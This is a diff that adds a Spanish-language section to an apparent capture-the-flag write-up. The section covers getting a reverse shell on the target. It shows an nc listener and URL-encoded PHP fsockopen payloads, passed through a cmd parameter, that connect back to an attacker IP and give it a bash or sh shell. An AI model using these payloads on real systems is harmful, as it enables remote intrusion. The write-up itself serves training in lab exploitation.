@@ -274,4 +274,22 @@ Hemos conseguido ejecutar comandos en la maquina victima, response de nuestra re
         	</pre>
 
 
+## Obtenemos Reverse Shell
+
+Nos ponemos en escucha para recibir la shell
+
+	┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/dump_git]
+	└─# nc -lnvp 1988  
+	listening on [any] 1988 ...
+
+ Generamos la reverse shell, esta debe ir url encode, en caso contrario no funcionara.
+
+ 	cmd=php -r '$sock=fsockopen("10.18.54.226",1988);exec("bash <&3 >&3 2>&3");';
+
+	cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.54.226%22%2C1988%29%3Bpopen%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27;
+
+Cuando ejecutamos la reverse shell nos da un error, indicandonos que no encuentra bash, por lo que cambiaremos a sh y todo resuelto.
+
+	cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.54.226%22%2C1988%29%3Bpopen%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27;
+
 
